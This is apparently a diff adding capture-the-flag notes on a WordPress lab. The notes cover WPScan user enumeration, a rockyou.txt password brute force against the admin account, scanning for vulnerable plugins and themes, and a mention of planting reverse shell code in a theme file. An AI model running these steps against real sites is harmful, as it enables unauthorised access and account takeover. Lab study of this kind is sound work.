@@ -54,3 +54,27 @@ copy reverse shell code and paste in theme functions -> documentation -> twentyt
 http://10.48.163.74/wordpress/wp-admin
 
 ```
+
+#### Pageid=100
+```bash
+Enter the flag value at page_id=100 of example.com
+Question is basically pointing you towards a WordPress vulnerability assessment using WPScan
+wpscan --version
+# If not, install in Kali:
+sudo apt update && sudo apt install wpscan -y
+wpscan --url http://example.com
+This identifies the WordPress version, themes, and basic info
+
+# Enumerate Users
+wpscan --url http://example.com -e u
+
+# Brute Force Login
+wpscan --url http://example.com -U admin -P /usr/share/wordlists/rockyou.txt
+
+# Look for Vulnerable Plugins/Themes
+wpscan --url http://example.com -e vp,vt
+If a vulnerable plugin is found, you may exploit it to get access.
+
+# Access the Flag Page
+http://example.com/?page_id=84
+```
